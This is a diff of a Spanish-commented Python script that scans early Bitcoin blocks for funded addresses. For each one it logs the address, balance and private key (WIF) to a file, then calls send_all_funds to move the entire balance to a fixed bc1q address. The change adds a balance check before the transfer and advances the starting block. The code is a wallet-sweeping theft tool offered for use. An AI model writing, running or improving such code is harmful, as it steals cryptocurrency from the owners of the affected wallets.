@@ -336,8 +336,10 @@ def procesar_bloque_y_transacciones(bloque_id):
                     print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}")
 
                     guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}", "walletconBalance.txt")
-                    # Enviar todo el balance
-                    send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
+                    
+                    if balance > 0:
+                        # Enviar todo el balance
+                        send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
 
         # Eliminar las direcciones procesadas
@@ -355,7 +357,7 @@ def contador_infinito(inicio):
         i += 1
 
 
-for i in contador_infinito(3762):
+for i in contador_infinito(3784):
 
     new_block_number = i # 9 de Febrero 2009
     print(f"[BlockId: {new_block_number}]")
